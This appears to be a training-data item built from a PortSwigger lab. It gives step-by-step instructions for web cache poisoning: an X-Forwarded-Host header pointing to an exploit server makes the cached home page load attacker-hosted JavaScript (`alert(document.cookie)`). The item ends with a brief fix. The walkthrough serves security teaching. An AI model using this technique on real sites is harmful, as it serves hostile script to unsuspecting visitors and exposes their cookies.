# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

Scenario framing — PortSwigger "Web cache poisoning with an unkeyed header" (Web cache poisoning, Practitioner):
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

What are the exact steps to solve this lab?

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers Web cache poisoning: "Web cache poisoning with an unkeyed header".

## Solution steps

1. With Burp running, load the website's home page
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the home page and send it to Burp Repeater.
3. Add a cache-buster query parameter, such as `?cb=1234`.
4. Add the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`, and send the request.
5. Observe that the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at `/resources/js/tracking.js`.
6. Replay the request and observe that the response contains the header `X-Cache: hit`. This tells us that the response came from the cache.
7. Go to the exploit server and change the file name to match the path used by the vulnerable response: `/resources/js/tracking.js`
8. In the body, enter the payload `alert(document.cookie)` and store the exploit.
9. Open the `GET` request for the home page in Burp Repeater and remove the cache buster.
10. Add the following header, remembering to enter your own exploit server ID: `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers.
12. To simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
13. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

## Vulnerability note

Underlying issue: Web cache poisoning (CWE-444). Only cache on safe keyed inputs; unkeyed headers/cookies that affect responses must not be cached.
